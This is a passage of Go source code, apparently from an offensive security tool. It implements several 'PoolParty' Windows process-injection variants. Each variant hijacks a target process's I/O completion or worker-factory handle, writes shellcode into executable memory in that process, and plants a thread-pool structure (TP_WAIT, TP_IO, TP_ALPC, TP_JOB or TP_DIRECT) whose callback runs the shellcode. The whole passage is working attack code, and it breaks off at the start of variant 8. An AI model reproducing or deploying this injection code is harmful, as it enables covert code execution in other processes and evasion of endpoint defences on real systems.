			uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
			uintptr(unsafe.Pointer(&bytesWritten)),
		)
		if ret == 0 {
			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
		}
		output += "[*] Updated old first item's Blink pointer\n"
	}

	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
	output += "[+] PoolParty Variant 2 injection completed successfully\n"

	return output, nil
}

// executeVariant3 implements TP_WAIT Insertion via Event signaling
func executeVariant3(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 3: TP_WAIT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
	pTpWait, _, err := procCreateThreadpoolWait.Call(
		shellcodeAddr, // Wait callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWait == 0 {
		return output, fmt.Errorf("CreateThreadpoolWait failed: %v", err)
	}
	output += "[+] Created TP_WAIT structure associated with shellcode\n"

	// Step 6: Allocate memory for TP_WAIT in target process
	var tpWait FULL_TP_WAIT
	tpWaitAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpWait)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpWaitAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)

	// Step 7: Write TP_WAIT to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpWaitAddr,
		pTpWait,
		uintptr(unsafe.Sizeof(tpWait)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)

	// Step 8: Allocate and write TP_DIRECT separately
	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
	var tpDirect TP_DIRECT
	tpDirectAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpDirectAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpDirectAddr,
		uintptr(unsafe.Pointer(&pWaitStruct.Direct)),
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += "[+] Wrote TP_DIRECT structure\n"

	// Step 9: Create event
	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
	hEvent, _, err := procCreateEventW.Call(
		0,     // Security attributes
		0,     // Manual reset (FALSE)
		0,     // Initial state (FALSE)
		uintptr(unsafe.Pointer(eventName)),
	)
	if hEvent == 0 {
		return output, fmt.Errorf("CreateEventW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hEvent))
	output += "[+] Created event 'PoolPartyEvent'\n"

	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
		pWaitStruct.WaitPkt,     // WaitCompletionPacketHandle
		uintptr(hIoCompletion),  // IoCompletionHandle
		hEvent,                  // TargetObjectHandle (event)
		tpDirectAddr,            // KeyContext (remote TP_DIRECT)
		tpWaitAddr,              // ApcContext (remote TP_WAIT)
		0,                       // IoStatus
		0,                       // IoStatusInformation
		0,                       // AlreadySignaled (NULL)
	)
	if status != 0 {
		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
	}
	output += "[+] Associated event with target's I/O completion port\n"

	// Step 11: Set event to trigger callback
	ret, _, err = procSetEvent.Call(hEvent)
	if ret == 0 {
		return output, fmt.Errorf("SetEvent failed: %v", err)
	}
	output += "[+] Set event to queue packet to I/O completion port\n"
	output += "[+] PoolParty Variant 3 injection completed successfully\n"

	// Cleanup local TP_WAIT
	procCloseThreadpoolWait.Call(pTpWait)

	return output, nil
}

// executeVariant4 implements TP_IO Insertion via File I/O completion
func executeVariant4(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 4: TP_IO Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create file with overlapped flag for async I/O
	fileName, _ := windows.UTF16PtrFromString("C:\\Windows\\Temp\\PoolParty.txt")
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(fileName)),
		uintptr(GENERIC_WRITE),
		uintptr(FILE_SHARE_READ|FILE_SHARE_WRITE),
		0, // Security attributes
		uintptr(CREATE_ALWAYS),
		uintptr(FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED),
		0, // Template file
	)
	if hFile == uintptr(windows.InvalidHandle) {
		return output, fmt.Errorf("CreateFileW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hFile))
	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"

	// Step 6: Create TP_IO structure via CreateThreadpoolIo
	pTpIo, _, err := procCreateThreadpoolIo.Call(
		hFile,
		shellcodeAddr, // I/O callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpIo == 0 {
		return output, fmt.Errorf("CreateThreadpoolIo failed: %v", err)
	}
	output += "[+] Created TP_IO structure associated with shellcode\n"

	// Step 7: Modify TP_IO - set callback and increment PendingIrpCount
	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
	output += "[+] Modified TP_IO: set callback and incremented PendingIrpCount\n"

	// Step 8: Allocate memory for TP_IO in target process
	var tpIo FULL_TP_IO
	tpIoAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpIo)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpIoAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)

	// Step 9: Write TP_IO to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpIoAddr,
		pTpIo,
		uintptr(unsafe.Sizeof(tpIo)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)

	// Step 10: Calculate remote TP_DIRECT address
	var dummyTpIo FULL_TP_IO
	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))

	// Step 11: Associate file with target's I/O completion port
	var ioStatusBlock IO_STATUS_BLOCK
	fileCompletionInfo := FILE_COMPLETION_INFORMATION{
		Port: uintptr(hIoCompletion),
		Key:  remoteTpDirectAddr,
	}
	status, _, _ := procZwSetInformationFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		uintptr(unsafe.Pointer(&fileCompletionInfo)),
		uintptr(unsafe.Sizeof(fileCompletionInfo)),
		uintptr(FileReplaceCompletionInformation),
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetInformationFile failed: 0x%X", status)
	}
	output += "[+] Associated file with target's I/O completion port\n"

	// Step 12: Write to file to trigger I/O completion
	data := []byte("PoolParty injection trigger")
	var overlapped windows.Overlapped
	ret, _, err = procWriteFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0, // Bytes written (NULL for async)
		uintptr(unsafe.Pointer(&overlapped)),
	)
	// WriteFile returns 0 for pending async operation, which is expected
	output += "[+] Wrote to file to trigger I/O completion\n"
	output += "[+] PoolParty Variant 4 injection completed successfully\n"

	// Cleanup local TP_IO
	procCloseThreadpoolIo.Call(pTpIo)

	return output, nil
}

// executeVariant5 implements TP_ALPC Insertion via ALPC port messaging
func executeVariant5(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 5: TP_ALPC Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
	var hTempAlpc uintptr
	status, _, _ := procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hTempAlpc)),
		0, // ObjectAttributes
		0, // PortAttributes
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hTempAlpc))
	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)

	// Step 6: Allocate TP_ALPC structure via TpAllocAlpcCompletion
	var pTpAlpc uintptr
	status, _, _ = procTpAllocAlpcCompletion.Call(
		uintptr(unsafe.Pointer(&pTpAlpc)),
		hTempAlpc,
		shellcodeAddr, // ALPC callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
	}
	output += "[+] Created TP_ALPC structure associated with shellcode\n"

	// Step 7: Generate random ALPC port name
	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
	portNameUTF16, _ := windows.UTF16FromString(portName)

	// Create UNICODE_STRING for port name
	var usPortName UNICODE_STRING
	usPortName.Length = uint16(len(portName) * 2)
	usPortName.MaximumLength = usPortName.Length + 2
	usPortName.Buffer = &portNameUTF16[0]

	// Step 8: Create the actual ALPC port with attributes
	var objAttr OBJECT_ATTRIBUTES
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
	objAttr.ObjectName = uintptr(unsafe.Pointer(&usPortName))

	var portAttr ALPC_PORT_ATTRIBUTES
	portAttr.Flags = 0x20000
	portAttr.MaxMessageLength = 328

	var hAlpc uintptr
	status, _, _ = procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hAlpc)),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hAlpc))
	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)

	// Step 9: Allocate memory for TP_ALPC in target process
	var tpAlpc FULL_TP_ALPC
	tpAlpcAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpAlpc)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpAlpcAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_ALPC failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)

	// Step 10: Write TP_ALPC to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpAlpcAddr,
		pTpAlpc,
		uintptr(unsafe.Sizeof(tpAlpc)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_ALPC failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_ALPC structure (%d bytes)\n", bytesWritten)

	// Step 11: Associate ALPC port with target's I/O completion port
	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpAlpcAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	status, _, _ = procNtAlpcSetInformation.Call(
		hAlpc,
		uintptr(AlpcAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&alpcAssoc)),
		uintptr(unsafe.Sizeof(alpcAssoc)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
	}
	output += "[+] Associated ALPC port with target's I/O completion port\n"

	// Step 12: Connect to ALPC port to trigger completion
	var hClientPort uintptr
	var clientObjAttr OBJECT_ATTRIBUTES
	clientObjAttr.Length = uint32(unsafe.Sizeof(clientObjAttr))

	// Prepare message
	message := "PoolParty ALPC trigger"
	var alpcMessage ALPC_MESSAGE
	alpcMessage.PortHeader.DataLength = uint16(len(message))
	alpcMessage.PortHeader.TotalLength = uint16(unsafe.Sizeof(alpcMessage.PortHeader)) + uint16(len(message))
	copy(alpcMessage.PortMessage[:], message)
	messageSize := uintptr(unsafe.Sizeof(alpcMessage))

	// Set timeout to 1 second to prevent blocking
	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals

	status, _, _ = procNtAlpcConnectPort.Call(
		uintptr(unsafe.Pointer(&hClientPort)),
		uintptr(unsafe.Pointer(&usPortName)),
		uintptr(unsafe.Pointer(&clientObjAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
		0x20000, // Connection flags
		0,       // RequiredServerSid
		uintptr(unsafe.Pointer(&alpcMessage)),
		uintptr(unsafe.Pointer(&messageSize)),
		0, // OutMessageAttributes
		0, // InMessageAttributes
		uintptr(unsafe.Pointer(&timeout)),
	)
	// NtAlpcConnectPort may return timeout status, which is expected
	output += "[+] Connected to ALPC port to trigger completion\n"
	output += "[+] PoolParty Variant 5 injection completed successfully\n"

	return output, nil
}

// executeVariant6 implements TP_JOB Insertion via Job object assignment
func executeVariant6(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 6: TP_JOB Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create job object
	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
	jobNameUTF16, _ := windows.UTF16PtrFromString(jobName)
	hJob, _, err := procCreateJobObjectW.Call(
		0, // Security attributes
		uintptr(unsafe.Pointer(jobNameUTF16)),
	)
	if hJob == 0 {
		return output, fmt.Errorf("CreateJobObjectW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hJob))
	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)

	// Step 6: Allocate TP_JOB structure via TpAllocJobNotification
	var pTpJob uintptr
	status, _, _ := procTpAllocJobNotification.Call(
		uintptr(unsafe.Pointer(&pTpJob)),
		hJob,
		shellcodeAddr, // Job callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
	}
	output += "[+] Created TP_JOB structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_JOB in target process
	var tpJob FULL_TP_JOB
	tpJobAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpJob)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpJobAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)

	// Step 8: Write TP_JOB to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpJobAddr,
		pTpJob,
		uintptr(unsafe.Sizeof(tpJob)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_JOB structure (%d bytes)\n", bytesWritten)

	// Step 9: Zero out existing job completion info (required before re-setting)
	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
	ret, _, err = procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&zeroAssoc)),
		uintptr(unsafe.Sizeof(zeroAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject (zero) failed: %v", err)
	}
	output += "[+] Zeroed out job object completion info\n"

	// Step 10: Associate job with target's I/O completion port
	jobAssoc := JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpJobAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	ret, _, err = procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&jobAssoc)),
		uintptr(unsafe.Sizeof(jobAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject failed: %v", err)
	}
	output += "[+] Associated job object with target's I/O completion port\n"

	// Step 11: Assign current process to job to trigger completion
	hCurrentProcess, _, _ := procGetCurrentProcess.Call()
	ret, _, err = procAssignProcessToJobObject.Call(
		hJob,
		hCurrentProcess,
	)
	if ret == 0 {
		return output, fmt.Errorf("AssignProcessToJobObject failed: %v", err)
	}
	output += "[+] Assigned current process to job object to trigger completion\n"
	output += "[+] PoolParty Variant 6 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	output += "[+] Crafted TP_DIRECT structure with shellcode callback\n"

	// Step 6: Allocate memory for TP_DIRECT in target process
	tpDirectAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpDirectAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	// Step 7: Write TP_DIRECT to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpDirectAddr,
		uintptr(unsafe.Pointer(&tpDirect)),
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_DIRECT structure (%d bytes)\n", bytesWritten)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// executeVariant8 implements TP_TIMER Insertion - Variant 8
func executeVariant8(shellcode []byte, pid uint32) (string, error) {
	var output string
	output = fmt.Sprintf("[*] PoolParty Variant 8: TP_TIMER Insertion\n")
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack worker factory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Hijack IR timer handle
